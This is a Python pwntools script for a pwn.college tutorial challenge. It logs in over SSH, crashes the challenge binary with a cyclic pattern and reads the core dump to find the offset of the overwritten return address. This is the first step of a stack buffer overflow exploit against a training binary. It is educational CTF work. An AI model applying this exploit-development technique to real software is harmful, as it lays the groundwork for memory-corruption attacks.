import pwn

from pwnlib.tubes import ssh
import logging
# context(arch="amd64", os="linux", log_level="info")
pwn.context(arch="amd64", os="linux", log_level="info")
shell = pwn.ssh('hacker', host="pwn.college", keyfile="~/key", )
# logging.info("success ssh!")
# run process
shell.run("ulimit -c unlimited  ")
process_challenge = shell.process("/challenge/pwntools-tutorials-level4.0")
assert isinstance(process_challenge,ssh.ssh_process)
# wait here until things
def wait_output():
    while True:
        data = process_challenge.recv(timeout=1)
        if data==b"":
            break
        print(data.decode("utf-8",errors="ignore"))
wait_output()
# read is over
print("read is over")
payload_byte = pwn.cyclic(999)
assert isinstance(payload_byte,bytes)
process_challenge.sendline(payload_byte)
process_challenge.wait()

core = process_challenge.corefile

rsp_value = core.rsp
# ok next we shoudld get the return addr
ret = core.read(rsp_value,8)
print("崩溃时ret值是：", ret)
offset = pwn.cyclic_find(ret)  # 找到这个ret对应在pattern中的偏移
print("偏移量是：", offset)
# when pocess ends, eof came out 
try:
    while True:
        data = process_challenge.recv(timeout=5)
        if data=="":
            break
        print(data.decode("utf-8"))
except EOFError:
    print("program ends.")

